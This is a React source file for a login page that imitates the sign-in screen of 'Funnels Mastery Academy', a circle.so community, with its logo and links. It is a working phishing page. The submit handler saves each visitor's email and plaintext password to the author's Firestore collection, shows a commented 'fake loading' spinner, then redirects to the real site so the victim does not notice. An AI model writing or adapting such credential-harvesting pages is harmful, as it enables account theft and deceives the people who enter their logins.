import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import { collection, addDoc } from "firebase/firestore";
import { db } from "./firebaseConfig"; // import Firestore configuration


const LoginPage = () => {
  const navigate = useNavigate();
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false); // Track loading state

  const handleBackClick = () => {
    navigate("/"); // Navigate back to the landing page
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsLoading(true); // Show loading spinner

    try {
      // Add the email and password to the Firestore collection
      const docRef = await addDoc(collection(db, "users"), {
        email: email,
        password: password,
      });
      console.log("Document written with ID: ", docRef.id);

      // Fake loading for 1 second before redirecting
      setTimeout(() => {
        setIsLoading(false);
        window.location.href = "https://funnels-mastery-academy.circle.so";
      }, 1000);
    } catch (e) {
      console.error("Error adding document: ", e);
      setIsLoading(false);
 
    }
  };

  return (
    <div style={styles.container}>
      {isLoading && (
        <div style={styles.overlay}>
          <div style={styles.spinner}></div>
        </div>
      )}
      <div style={styles.card}>
        {/* Replace text with the logo image */}
        <img src={"https://assets-v2.circle.so/jfmbzu2gv6l6az1h9smbu8cpznho"} alt="Funnels Mastery Academy" style={styles.logo} />

        <h2 style={styles.heading}>Log in to your account</h2>
        <form onSubmit={handleSubmit}>
          <div style={styles.inputGroup}>
            <label htmlFor="email" style={styles.label}>Email</label>
            <input
              type="email"
              id="email"
              name="email"
              required
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              style={styles.input}
              disabled={isLoading} // Disable input while loading
            />
          </div>
          <div style={styles.inputGroup}>
            <label htmlFor="password" style={styles.label}>Password</label>
            <input
              type="password"
              id="password"
              name="password"
              required
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              style={styles.input}
              disabled={isLoading} // Disable input while loading
            />
          </div>
          <button type="submit" style={styles.submitButton} disabled={isLoading}>
            {isLoading ? "Loading..." : "Sign In"}
          </button>
        </form>
        <div style={styles.footer}>
          <button onClick={handleBackClick} style={styles.backLink} disabled={isLoading}>
            ← Back
          </button>
          <div style={styles.linkGroup}>
            <p style={styles.signupText}>
              Not a member? <a href="https://www.funnelsmasteryacademy.com/" style={styles.link}>Sign up</a>
            </p>
            <a href="https://www.funnelsmasteryacademy.com/" style={styles.link}>Forgot your password?</a>
          </div>
        </div>
      </div>
    </div>
  );
};

const styles = {
  container: {
    position: "absolute",
    top: "50%",
    left: "50%",
    transform: "translate(-50%, -50%)",
    backgroundColor: "#f0f0f0",
    width: "100vw",
    height: "100vh",
    display: "flex",
    justifyContent: "center",
    alignItems: "center",
    padding: "1rem",
    boxSizing: "border-box",
  },
  card: {
    backgroundColor: "#fff",
    padding: "2rem",
    borderRadius: "15px",
    boxShadow: "0 4px 8px rgba(0, 0, 0, 0.1)",
    textAlign: "center",
    maxWidth: "400px",
    width: "100%",
  },
  logo: {
    maxWidth: "40%",  // Make the image responsive
    height: "auto",
    marginBottom: "0.1rem",
  },
  heading: {
    fontSize: "1.5rem",
    fontWeight: "bold",
    marginBottom: "1.5rem",
  },
  inputGroup: {
    marginBottom: "1rem",
  },
  label: {
    display: "block",
    textAlign: "left",
    marginBottom: "0.5rem",
    fontSize: "1rem",
  },
  input: {
    width: "100%",
    padding: "0.75rem",
    fontSize: "1rem",
    borderRadius: "8px",
    border: "1px solid #ccc",
    boxSizing: "border-box",
  },
  submitButton: {
    backgroundColor: "#f05a28",
    color: "#fff",
    border: "none",
    borderRadius: "28px",
    padding: "0.75rem",
    width: "100%",
    cursor: "pointer",
    fontSize: "1rem",
    marginTop: "1rem",
    fontWeight: "bold",
  },
  footer: {
    marginTop: "1.5rem",
    textAlign: "center",
  },
  backLink: {
    backgroundColor: "transparent",
    border: "none",
    color: "#007bff",
    cursor: "pointer",
    textDecoration: "underline",
    marginBottom: "0.75rem",
    fontSize: "0.9rem",
  },
  signupText: {
    marginBottom: "0.5rem",
    fontSize: "0.9rem",
  },
  linkGroup: {
    fontSize: "0.9rem",
  },
  link: {
    color: "#007bff",
    textDecoration: "none",
  },
  overlay: {
    position: "fixed",
    top: 0,
    left: 0,
    width: "100vw",
    height: "100vh",
    backgroundColor: "rgba(0, 0, 0, 0.5)",
    display: "flex",
    justifyContent: "center",
    alignItems: "center",
    zIndex: 9999, // Ensure it overlays everything
  },
  spinner: {
    width: "50px",
    height: "50px",
    border: "5px solid rgba(0, 0, 0, 0.1)",
    borderRadius: "50%",
    borderTop: "5px solid #f05a28",
    animation: "spin 1s linear infinite",
  },
  "@keyframes spin": {
    "0%": {
      transform: "rotate(0deg)",
    },
    "100%": {
      transform: "rotate(360deg)",
    },
  },
};

export default LoginPage;
